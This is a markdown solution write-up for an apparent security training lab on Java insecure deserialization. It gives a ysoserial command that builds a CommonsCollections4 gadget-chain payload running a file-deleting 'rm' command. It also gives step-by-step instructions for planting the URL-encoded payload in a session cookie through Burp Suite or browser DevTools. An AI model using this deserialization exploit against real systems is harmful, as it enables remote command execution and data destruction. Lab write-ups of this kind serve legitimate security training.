# Lab 2 - Final Solution (Working Payload)

## ✅ Reference Working Payload

**The working CommonsCollections4 payload is in: [LAB2_PAYLOADS.md](LAB2_PAYLOADS.md)**

Copy the payload from that file to use it.

---

## 🎯 How to Use the Payload

### In Burp Suite (Recommended):

1. Open Burp Suite
2. Go to **Proxy** tab → intercept a request to the lab
3. Right-click → **Send to Repeater**
4. In **Repeater**, find the `Cookie:` header
5. Find the `session=` value
6. **Delete the current session value**
7. **Paste the payload** from [LAB2_PAYLOADS.md](LAB2_PAYLOADS.md)
8. Click **Send**
9. ✅ **Lab solved!**

### In Browser DevTools (Alternative):

1. Press **F12**
2. Go to **Application** tab → **Cookies**
3. Click the `session` cookie
4. Delete current value
5. Paste the payload from [LAB2_PAYLOADS.md](LAB2_PAYLOADS.md)
6. Press **Enter**
7. **Refresh the page** (F5)

---

## 💡 Key Learnings

### What Went Wrong (Previous Attempts)

The earlier payloads failed because:
- **Incorrect URL-encoding** - special characters in Base64 not properly encoded for cookies
- **Wrong gadget chain** - CommonsCollections6 had type mismatches
- **Missing JVM flags** - `--add-opens` flags weren't part of ysoserial generation

### What Fixed It (CommonsCollections4)

✅ **Proper URL-encoding** - entire Base64 payload encoded correctly  
✅ **CommonsCollections4 chain** - most reliable for modern Java versions  
✅ **Correct JVM flags** - included in ysoserial command generation  
✅ **Tested & verified** - successfully deletes target file  

### Command Used to Generate

```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens java.base/java.net=ALL-UNNAMED \
   --add-opens java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
```

---

## 🚫 Payloads NOT to Use

The following were tested but **DO NOT WORK**:

- ❌ CommonsCollections6 (HashSet variant)
- ❌ CommonsCollections3 variants
- ❌ Improperly encoded Base64
- ❌ Other gadget chains
- ❌ touch command variants
- ❌ bash -c command variants

**Use only the CommonsCollections4 payload from [LAB2_PAYLOADS.md](LAB2_PAYLOADS.md)**

---

## ✅ Verification

Lab 2 is **SOLVED** when:
- ✅ morale.txt is deleted
- ✅ Lab page shows "is-solved" status
- ✅ No 500 errors in response

**[See the working payload →](LAB2_PAYLOADS.md)**
